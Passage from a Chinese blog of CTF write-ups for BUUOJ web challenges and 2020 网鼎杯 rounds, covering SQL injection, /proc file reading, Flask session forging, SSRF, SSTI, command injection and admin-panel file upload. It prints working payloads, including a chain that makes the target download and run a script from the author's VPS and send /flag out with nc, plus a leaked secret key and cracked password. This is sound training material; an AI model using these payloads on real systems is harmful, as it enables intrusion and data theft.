<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003943.png" alt="image-20201206125312562"></p>
<p>查表名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;login.php?tips&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn</span><br><span class="line">Content-Length: 156</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn</span><br><span class="line">Referer: http:&#x2F;&#x2F;344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn&#x2F;login.php?tips&#x3D;1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: UM_distinctid&#x3D;175e67f63ec3dc-07bb01a5c02175-7c690e53-13c680-175e67f63edb2a; PHPSESSID&#x3D;4pb5b72mqrn5m5n7ndk3edv9i6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>

<p>string(33) “XPATH syntax error: ‘~fl4g,users’”<br>{“error”:1,”msg”:”账号不存在”}</p>
<p>查列名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;)),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line"></span><br><span class="line">string(27) &quot;XPATH syntax error: &#39;~flag&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;账号不存在&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>查字段：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003933.png" alt="image-20201206125621103"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(flag) from fl4g)),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>

<h1 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h1><ul>
<li>/proc 文件系统知识。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</span><br><span class="line">&#x2F;proc&#x2F;mounts # 挂载的文件系统列表</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp # arp表，可以获得内网其他机器的地址</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route # 路由表信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;tcp and &#x2F;proc&#x2F;net&#x2F;udp # 活动连接的信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie # 路由缓存</span><br><span class="line">&#x2F;proc&#x2F;version  # 内核版本</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cmdline # 可能包含有用的路径信息</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;environ #  程序运行的环境变量信息，可以用来包含getshell</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cwd     # 当前进程的工作目录</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span><br></pre></td></tr></table></figure>

<p>cmdline：运行了 server.py</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003922.png" alt="image-20201206130357952"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003911.png" alt="image-20201206130331192"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)<span class="comment">#execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key @ app.route(<span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>: session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">template = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> session[</span><br><span class="line">    <span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> %</span><br><span class="line">session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>) @ app.route(<span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span> error = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    page = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">else</span>:</span><br><span class="line">    page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"><span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>: page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    template = open(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.format(page)).read() <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    template = e</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003900.png" alt="image-20201206130801068"></p>
<p>得到key为：<code>Drmhze6EPcv0fN_81Bj-nA</code></p>
<p>构造 flask session， session 做了 ssti 过滤。</p>
<h1 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h1><p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h1><ul>
<li>第一关</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003846.png" alt="image-20201206172504404"></p>
<p>简单闭合一下就行了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003824.png" alt="image-20201206172606385"></p>
<ul>
<li>第二关</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003808.png" alt="image-20201206172648845"></p>
<h1 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h1><p>只是没回显而已。直接nc是不行的，估计是没有nc？</p>
<p>在公网VPS中保存 如下 sh 脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|cat &#x2F;flag | nc 公网ip地址 8089</span><br></pre></td></tr></table></figure>

<p>利用靶机进行   curl 下载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acurl 公网ip地址&#x2F;1.sh &gt; &#x2F;tmp&#x2F;1.sh   #请求bash文件到tmp目录</span><br><span class="line">127.0.0.1%0achmod 777 &#x2F;tmp&#x2F;1.sh #给bash加权限</span><br><span class="line">nc -lvp 8089  #你的机器上进行监听8089端口</span><br><span class="line">127.0.0.1%0ash &#x2F;tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure>





<h1 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="[第二章 web进阶]文件上传"></a>[第二章 web进阶]文件上传</h1><ul>
<li>zip 压缩包的知识</li>
</ul>
<h1 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h1><p>sb做法，tplmap –os-shell 梭了。</p>
<p>手工做法:</p>
<p>用 ssti payload，读文件，在 <code>/app/server.py</code>中有flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;app&#x2F;server.py&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>



<h1 id="第三章-web进阶-逻辑漏洞"><a href="#第三章-web进阶-逻辑漏洞" class="headerlink" title="[第三章 web进阶]逻辑漏洞"></a>[第三章 web进阶]逻辑漏洞</h1><ul>
<li>修改价格为负数，先赚钱，再去买flag</li>
</ul>
<h1 id="第三章-web进阶-Python里的SSRF"><a href="#第三章-web进阶-Python里的SSRF" class="headerlink" title="[第三章 web进阶]Python里的SSRF"></a>[第三章 web进阶]Python里的SSRF</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003757.png" alt="image-20201207003632241"></p>
<p>啊这，直接 127.0.0.1,没有用。尝试用8进制绕，不行，换成127.0.0.2就成功了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003750.png" alt="image-20201207003614371"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/d3b1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/d3b1.html" class="post-title-link" itemprop="url">2020年网鼎杯总决赛复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-06 00:20:39" itemprop="dateCreated datePublished" datetime="2020-12-06T00:20:39+08:00">2020-12-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-07 00:43:06" itemprop="dateModified" datetime="2020-12-07T00:43:06+08:00">2020-12-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="网鼎杯-2020-总决赛-Novel"><a href="#网鼎杯-2020-总决赛-Novel" class="headerlink" title="[网鼎杯 2020 总决赛]Novel"></a>[网鼎杯 2020 总决赛]Novel</h1><p>上传，备份的时候转为了php。</p>
<p><code>echo $&#123;eval(eval(system(ifconfig)))&#125;;</code></p>
<p><code>php &gt; echo $&#123;eval(system(ifconfig))&#125;;</code></p>
<p>上传时的请求包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011537.png" alt="image-20201206003951631"></p>
<p>私藏的请求包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011538.png" alt="image-20201206003933467"></p>
<p>带上密码去访问，有点想访问webshell的感觉。只不过这里相当于有两个密码。</p>
<h1 id="网鼎杯-2020-总决赛-Game-Exp"><a href="#网鼎杯-2020-总决赛-Game-Exp" class="headerlink" title="[网鼎杯 2020 总决赛]Game Exp"></a>[网鼎杯 2020 总决赛]Game Exp</h1><h1 id="网鼎杯-2020-总决赛-Vulnfaces"><a href="#网鼎杯-2020-总决赛-Vulnfaces" class="headerlink" title="[网鼎杯 2020 总决赛]Vulnfaces"></a>[网鼎杯 2020 总决赛]Vulnfaces</h1>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/6ebd.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/6ebd.html" class="post-title-link" itemprop="url">2020年网鼎杯半决赛复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-05 16:16:12" itemprop="dateCreated datePublished" datetime="2020-12-05T16:16:12+08:00">2020-12-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-06 00:10:35" itemprop="dateModified" datetime="2020-12-06T00:10:35+08:00">2020-12-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h1><p>右手就行的题目。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>

<p>直接 <code>/flag</code>  也行</p>
<h1 id="网鼎杯-2020-半决赛-faka"><a href="#网鼎杯-2020-半决赛-faka" class="headerlink" title="[网鼎杯 2020 半决赛]faka"></a>[网鼎杯 2020 半决赛]faka</h1><p>一个tp二次开发的站点，有数据库文件。打开数据库文件，在system_user中可以看到admin 账号的hash，在somd5中可以直接解出来。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201205232546.png" alt="image-20201205220254897"></p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/%EF%BC%8C%E4%B8%BA">https://www.somd5.com/，为</a> admincccbbb123</p>
<h2 id="后台文件上传GetShell"><a href="#后台文件上传GetShell" class="headerlink" title="后台文件上传GetShell"></a>后台文件上传GetShell</h2><p>进入后台</p>
<ul>
<li>上传点</li>
<li>注入点</li>
<li>命令执行点</li>
</ul>
<p>找到上传点，抓包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201205232547.png" alt="image-20201205223232188"></p>
<p>post的数据中有md5的hash，同时也是拼接到了路径中的。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7838">https://xz.aliyun.com/t/7838</a></p>
<p>找到对应的文件上传点的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUploadFile</span>(<span class="params">$field, $url = <span class="literal">false</span>, $extison = []</span>) </span>&#123;</span><br><span class="line">    $request = \think\Request::instance();</span><br><span class="line">    $file    = $request-&gt;file($field);</span><br><span class="line">    <span class="keyword">if</span> (!$file) &#123;</span><br><span class="line">        <span class="keyword">return</span> wrong(<span class="string">&#x27;上传文件不存在&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ext      = pathinfo($file-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), <span class="number">4</span>);</span><br><span class="line">    $md5      = [uniqid(), uniqid()];</span><br><span class="line">    $filename = join(<span class="string">&#x27;/&#x27;</span>, $md5) . <span class="string">&quot;.&#123;$ext&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($extison)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $extison)) &#123;</span><br><span class="line">            <span class="keyword">return</span> wrong(<span class="string">&#x27;文件上传类型受限&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ext == <span class="string">&#x27;php&#x27;</span> || !in_array(strtolower($ext), explode(<span class="string">&#x27;,&#x27;</span>, strtolower(sysconf(<span class="string">&#x27;storage_local_exts&#x27;</span>))))) &#123;</span><br><span class="line">            <span class="keyword">return</span> wrong(<span class="string">&#x27;文件上传类型受限&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件上传处理</span></span><br><span class="line">    <span class="keyword">if</span> (($info = $file-&gt;move(<span class="string">&#x27;static&#x27;</span> . DS . <span class="string">&#x27;upload&#x27;</span> . DS . $md5[<span class="number">0</span>], $md5[<span class="number">1</span>], <span class="literal">true</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($url) &#123;</span><br><span class="line">            $site_url = FileService::getFileUrl($filename, <span class="string">&#x27;local&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ($site_url) &#123;</span><br><span class="line">                <span class="keyword">return</span> right([<span class="string">&#x27;file&#x27;</span> =&gt; $site_url, <span class="string">&#x27;filename&#x27;</span> =&gt; $filename, <span class="string">&#x27;resource&#x27;</span> =&gt; $info], <span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> wrong(<span class="string">&#x27;获取上传文件&#x27;</span> . $filename . <span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">            